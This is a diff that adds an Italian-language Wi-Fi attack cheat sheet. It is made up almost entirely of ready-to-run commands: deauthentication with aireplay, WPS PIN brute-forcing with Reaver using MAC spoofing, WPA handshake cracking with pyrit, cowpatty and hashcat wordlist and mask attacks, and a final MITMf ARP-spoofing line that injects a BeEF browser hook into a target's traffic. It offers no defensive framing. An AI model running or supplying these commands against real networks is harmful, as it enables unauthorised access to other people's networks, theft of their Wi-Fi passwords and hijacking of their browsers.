@@ -1,0 +1,133 @@
+Wifi Attack
+
+
+
+#GET AUTH#
+
++ airmon-ng start wlan0							=> Monitor Mode
++ airodump-ng interface
++ airodump-ng -b BSSID -c CHANNEL INTERFACE
++ aireplay -a BSSID --deauth NUM INTERFACE
+
++ wifite -wpa								=> Avvio Wifite
++ wifite wpa2
+
++ Reaver -i mon0 -c x -b xx:xx:xx:xx:xx:xx -vv --mac=vv:vv:vv:vv:vv:vv 		=> Monitor Con Reaver con MAC spoof
++ reaver -i mon0 -b 00:01:02:03:04:05 -vv		=> Avvia monitor con reaver
++ reaver -i mon0 -b 00:01:02:03:04:05 -c 11 -e linksys
++ reaver -i mon0 -b 00:01:02:03:04:05 --fixed		=> Se AP cambia canale
++ reaver -i mon0 -b 00:01:02:03:04:05 -t 2		=> Con timeout
++ reaver -i mon0 -b 00:01:02:03:04:05 -d 0		=> Delay su tentativi PIN
++ reaver -i mon0 -b 00:01:02:03:04:05 --nack		=> Disabilita Nacks se si sa che l'AP gli invia
++ reaver -i mon0 -b 00:01:02:03:04:05 --eap-terminate	=> Invia EAP Fail Message per chiudere sessione WPS
++ reaver -i mon0 -b 00:01:02:03:04:05 --fail-wait=360	=> Se appare un messaggio di FAIL va in attesa per 360
++ reaver -i mon0 -b 00:01:02:03:04:05 -vv -d 0		=> Disattiva PIN DELAY per velocizzare
++ reaver -i mon0 -b 00:01:02:03:04:05 -vv --dh-small	=> Utilizza piccoli numeri segreti diffie-hellman per velocizzare
+Cambiare MAC dell'interfaccia virtuale monitor non funziona. Bisogna cambiare l'indirizzo di MAC dell'interfaccia wireless fisica, ad esempio:
++ ifconfig wlan0 down
++ ifconfig wlan0 hw ether 00:BA:AD:BE:EF:69
++ ifconfig wlan0 up
++ airmon-ng start wlan0
++ reaver -i mon0 -b 00:01:02:03:04:05 -vv --mac=00:BA:AD:BE:EF:69
+
+
+
+
+
+#CRACK AUTH#
+
+_Dictionary Attack with Pyrit_
+
++ cp /usr/share/wordlists/rockyou.txt.gz		=> Copy base wordlist
+
++ gunzip rockyou.txt.gz						=> Unzip
+
++ cat rockyou.txt | sort | uniq | pw-inspector -m 8 -M 63 > newrockyou.txt 	=> Creazione nuovo file con min8char MAX63char
+
++ wc -l newrockyou.txt						=> Numero di entry nel file
+
+
+_crack con pyrit_
+
+
+
++ pyrit -e 'BigPond' create_essid				=> Crea ESSID 'BigPond' in database pyrit
+
++ pyrit -i /root/cudacapture/wpa.lst import_passwords		=> Import Dizionario passowrds
+
++ pyrit batch								=> batchprocessing pyrit
+
++ pyrit -r hs/BigPond_58-98-35-E9-2B-8D.cap attack_db => Attack the hash (con database, piu` veloce)
+
++ crunch 0 25 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWX YZ0123456789 | pyrit -r xxx.cap -b xx:xx:xx:xx:xx:xx -i - attack_passthrough 			=> Pyrit with crunch
+
++ pyrit -r hs/BigPond_58-98-35-E9-2B-8D.cap -i /root/wpa.lst attack_passthrough		=> Attacca l'hash (no database, piu` lento)
+
+
+
+
+_crack con cowpatty_
+
+
+
++ pyrit -e BigPond -o cow.out export_cowpatty			=> Esporta output pyrit in cowpatty
+
++ cowpatty -d cow.out -s BigPond -r hs/BigPond_58-98-35-E9-2B-8D.cap		=> Start cracking
+(Cowpatty error se dizionario > 2 GB)
+
++ pyrit -r hs/BigPond_58-98-35-E9-2B-8D.cap -i /root/cow.out attack_cowpatty		=> Crea file output per cowpatty
+
+
+_clean database_
+
++ pyrit BigPond delete_essid			=> Ripulisce il database pyrit
+
+
+
+_crack con hashcat_
+
+
+
+Hashcat permette regole e maschere personalizzate per il cracking.
+
+built-in charset:
+?l = abcdefghijklmnopqrstuvwxyz
+?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ
+?d = 0123456789
+?s = !”#$%&'()*+,-./:;⇔?@[\]^_`{|}~
+?a = ?l?u?d?s
+
+Charset da usare in funzione della password:
+PASSWORD		|	CHARSET
+8numeri				?d?d?d?d?d?d?d?d
+8uppercase_letters		?u?u?u?u?u?u?u?u
+8lowercase_letters		?l?l?l?l?l?l?l?l
+8(lowercase_letter+num)*4	?l?d?l?d?l?d?l?d
+8(uppercase_letter+num)*4	?u?d?u?d?u?d?u?d
+ALL_RANDOM			?a?a?a?a?a?a?a?a
+
++ wpaclean <out.cap> <in.cap>				=> Ripulisce file .cap
+
++ aircrack-ng <out.cap> -J <out.hccap>			=> Converte da .cap a .hccap
+
++ cudahashcat --help | grep WPA				=> Trova modalita` da usare
+
++ cudahashcat -m 2500 /root/hs/out.hccap /root/rockyou.txt		=> Start Cracking
+
++ cudahashcat -m 2500 -a 3 capture.hccap ?d?d?d?d?d?d?d?d		=> MASK Attack
+
++ cat hashcat.pot				=> Locazione password crackate
+
+
+
+
+
+
+_inject BeefHook_
+
+
++ mitmf --spoof --arp -i wlan0 --gateway IPGATEWAY --target IPTARGET --inject --js-url HOOKBEEF		=> (Forse solo wired)
+
+
+
+
